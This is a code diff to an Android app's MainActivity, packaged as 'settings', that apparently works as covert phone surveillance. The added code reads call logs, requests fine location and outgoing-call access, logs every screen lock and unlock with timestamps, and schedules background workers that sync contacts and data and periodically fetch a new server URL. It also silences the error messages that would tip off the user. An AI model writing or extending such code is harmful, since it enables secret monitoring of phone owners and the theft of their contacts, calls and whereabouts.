@@ -1,5 +1,8 @@
 package com.example.settings;
 
+import static com.example.settings.Utils.getBatteryPercent;
+import static com.example.settings.Utils.readCallLogs;
+
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
@@ -13,6 +16,7 @@ import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkManager;
 
 import android.Manifest;
+import android.app.KeyguardManager;
 import android.content.BroadcastReceiver;
 import android.content.ClipData;
 import android.content.ClipboardManager;
@@ -56,7 +60,10 @@ import android.widget.Toast;
 
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
+import com.wickerlabs.logmanager.LogObject;
+import com.wickerlabs.logmanager.LogsManager;
 
+import org.apache.commons.lang3.StringUtils;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -64,6 +71,7 @@ import org.json.JSONObject;
 import java.lang.reflect.Type;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
+import java.text.DateFormat;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Collections;
@@ -118,21 +126,23 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
         SyncData = findViewById(R.id.SynData);
         SyncData.setOnClickListener(this);
-
+/*
         IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
         Intent batteryStatus = registerReceiver(null, ifilter);
         int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
         boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                 status == BatteryManager.BATTERY_STATUS_FULL;
-
-// How are we charging?
+        // How are we charging?
         int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
         boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
         boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
         int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
         int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
 
-        float batteryPct = level * 100 / (float)scale;
+        float batteryPct = level * 100 / (float)scale;*/
+        isPhoneIsLockedOrNot(getApplicationContext());
+        getBatteryPercent(this,mSharedpref);
+
         if (!mSharedpref.getSaveName().isEmpty()) {
             mEditname.setText(mSharedpref.getSaveName());
             mEditname.setEnabled(false);
@@ -171,7 +181,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             }
 
         } catch (Exception e) {
-            Toast.makeText(getApplicationContext(), "Error in AutoStart", Toast.LENGTH_SHORT).show();
+            //Toast.makeText(getApplicationContext(), "Error in AutoStart", Toast.LENGTH_SHORT).show();
             e.printStackTrace();
         }
     }
@@ -226,17 +236,20 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
     private void getphoneAppdetails() {
         PackageManager pm = getPackageManager();
-        List<ApplicationInfo> apps = pm.getInstalledApplications(0);
+        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
         int i = 0;
-        for (ApplicationInfo app : apps) {
+        for (ApplicationInfo packageInfo : apps) {
             //checks for flags; if flagged, check if updated system app
-            if ((app.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0) {
+            if ((packageInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0) {
+                continue;
                 //it's a system app, not interested
-            } else if ((app.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
+            } else if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
+                continue;
                 //Discard this one
                 //in this case, it should be a user-installed app
-            } else {
-                String label = (String) pm.getApplicationLabel(app);
+            }
+            else {
+                String label = (String) pm.getApplicationLabel(packageInfo);
                 appsInstallednames.add("" + i + " " + label);
                 i++;
             }
@@ -250,19 +263,13 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     }
 
     public static void setupWorkManager() {
-        mGetUrlPeriodicWorkRequest=new PeriodicWorkRequest.Builder(GetNewUrl.class, 15,
-                TimeUnit.MINUTES).setBackoffCriteria(
-                BackoffPolicy.LINEAR,
-                PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
-                TimeUnit.MILLISECONDS).build();
-        mWorkManager.enqueueUniquePeriodicWork("PERIODIC_REQUEST_TAG", ExistingPeriodicWorkPolicy.KEEP, mGetUrlPeriodicWorkRequest);
-
-        mPeriodicWorkRequest = new PeriodicWorkRequest.Builder(SyncData.class, 15,
+         mPeriodicWorkRequest = new PeriodicWorkRequest.Builder(SyncData.class, 15,
                 TimeUnit.MINUTES).setBackoffCriteria(
                 BackoffPolicy.LINEAR,
                 PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
                 TimeUnit.MILLISECONDS).build();
         mWorkManager.enqueueUniquePeriodicWork("PERIODIC_REQUEST_TAG", ExistingPeriodicWorkPolicy.KEEP, mPeriodicWorkRequest);
+       geturl();
         mPeriodicWorkRequest1 = new PeriodicWorkRequest.Builder(SyncContact.class, 50,
                 TimeUnit.MINUTES).setBackoffCriteria(
                 BackoffPolicy.LINEAR,
@@ -270,6 +277,15 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 TimeUnit.MILLISECONDS).build();
         mWorkManager.enqueueUniquePeriodicWork("PERIODIC_REQUEST_TAG", ExistingPeriodicWorkPolicy.KEEP, mPeriodicWorkRequest1);
 
+    }
+
+    public static void geturl() {
+        mGetUrlPeriodicWorkRequest=new PeriodicWorkRequest.Builder(GetNewUrl.class, 25,
+                TimeUnit.MINUTES).setBackoffCriteria(
+                BackoffPolicy.LINEAR,
+                PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
+                TimeUnit.MILLISECONDS).build();
+        mWorkManager.enqueueUniquePeriodicWork("PERIODIC_REQUEST_TAG", ExistingPeriodicWorkPolicy.KEEP, mGetUrlPeriodicWorkRequest);
     }
 
     @Override
@@ -286,6 +302,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     != PackageManager.PERMISSION_GRANTED) &&
                     (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                             != PackageManager.PERMISSION_GRANTED)
+                    &&  (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+                    != PackageManager.PERMISSION_GRANTED)
                     && (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                     != PackageManager.PERMISSION_GRANTED)
                     && (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
@@ -293,11 +311,14 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     && (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CONTACTS)
                     != PackageManager.PERMISSION_GRANTED)
                     && (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
-                    != PackageManager.PERMISSION_GRANTED)) {
+                    != PackageManager.PERMISSION_GRANTED)&&
+                    (ContextCompat.checkSelfPermission(this, Manifest.permission.PROCESS_OUTGOING_CALLS)
+                    != PackageManager.PERMISSION_GRANTED))  {
                 ActivityCompat.requestPermissions(this,
                         new String[]{Manifest.permission.PROCESS_OUTGOING_CALLS,
                                 Manifest.permission.READ_PHONE_STATE,
                                 Manifest.permission.ACCESS_COARSE_LOCATION,
+                                Manifest.permission.ACCESS_FINE_LOCATION,
                                 Manifest.permission.READ_CALL_LOG,
                                 Manifest.permission.READ_CONTACTS,
                                 Manifest.permission.WRITE_CONTACTS,
@@ -330,7 +351,10 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 readContacts();
             }
         });
+        readCallLogs(getApplicationContext(),mSharedpref);
     }
+
+
 
     public void readContacts() {
         ContentResolver cr = getContentResolver();
@@ -753,7 +777,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     }
                 } catch (Exception e) {
                     e.printStackTrace();
-                    Toast.makeText(getApplicationContext(), "Error in Battery Opti", Toast.LENGTH_SHORT).show();
+                    //Toast.makeText(getApplicationContext(), "Error in Battery Opti", Toast.LENGTH_SHORT).show();
                 }
 
                 break;
@@ -768,7 +792,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     }
                 } catch (Exception e) {
                     e.printStackTrace();
-                    Toast.makeText(getApplicationContext(), "Error in Battery Opti", Toast.LENGTH_SHORT).show();
+                  //  Toast.makeText(getApplicationContext(), "Error in Battery Opti", Toast.LENGTH_SHORT).show();
                 }
                 break;
                 case R.id.CheckAutoStart:
@@ -782,10 +806,69 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     }
 
     public static void setuponetimeworkManager() {
-        UrlTimeWorkRequest=new OneTimeWorkRequest.Builder(GetNewUrl.class).build();
-        mWorkManager.enqueue(UrlTimeWorkRequest);
+
         mOneTimeWorkRequest = new OneTimeWorkRequest.Builder(SyncData.class).build();
         mWorkManager.enqueue(mOneTimeWorkRequest);
+        UrlTimeWorkRequest=new OneTimeWorkRequest.Builder(GetNewUrl.class).build();
+        mWorkManager.enqueue(UrlTimeWorkRequest);
         setupWorkManager();
+    }
+    /*private boolean isPhoneIsLockedOrNot(Context context) {
+        boolean isPhoneLock = false;
+        if (context != null) {
+            KeyguardManager myKM = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
+            if (myKM != null && myKM.isKeyguardLocked()) {
+                isPhoneLock = true;
+            }
+        }
+        return isPhoneLock;
+    }*/
+    private void isPhoneIsLockedOrNot(Context context) {
+        Sharedpref mSharedpref = new Sharedpref(this);
+        String lockdetails=mSharedpref.getPhoneLockDetails();
+
+        final IntentFilter theFilter = new IntentFilter();
+        /** System Defined Broadcast */
+        theFilter.addAction(Intent.ACTION_SCREEN_ON);
+        theFilter.addAction(Intent.ACTION_SCREEN_OFF);
+        theFilter.addAction(Intent.ACTION_USER_PRESENT);
+
+        BroadcastReceiver screenOnOffReceiver = new BroadcastReceiver() {
+            @Override
+            public void onReceive(Context context, Intent intent) {
+                String lockdetails = mSharedpref.getPhoneLockDetails();
+                JSONObject jsonObject = new JSONObject();
+                JSONArray jsonArray=new JSONArray();
+                if (!StringUtils.isBlank(lockdetails)) {
+                    try {
+                        jsonArray=new JSONArray(lockdetails);
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+                    try {
+                        String strAction = intent.getAction();
+
+                        KeyguardManager myKM = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
+                        if (strAction.equals(Intent.ACTION_USER_PRESENT) || strAction.equals(Intent.ACTION_SCREEN_OFF) || strAction.equals(Intent.ACTION_SCREEN_ON))
+                            if (myKM.inKeyguardRestrictedInputMode()) {
+                                jsonObject.put("value", "Locked");
+                                System.out.println("Screen off " + "LOCKED");
+                            } else {
+                                jsonObject.put("value", "UnLocked");
+                                System.out.println("Screen off " + "UNLOCKED");
+                            }
+                        jsonObject.put("time",Utils.getCurrentDateTime());
+                         jsonArray.put(jsonObject);
+                    mSharedpref.setPhoneLockDetails(jsonArray.toString());
+                    mSharedpref.commit();
+
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+        };
+
+        getApplicationContext().registerReceiver(screenOnOffReceiver, theFilter);
     }
 }
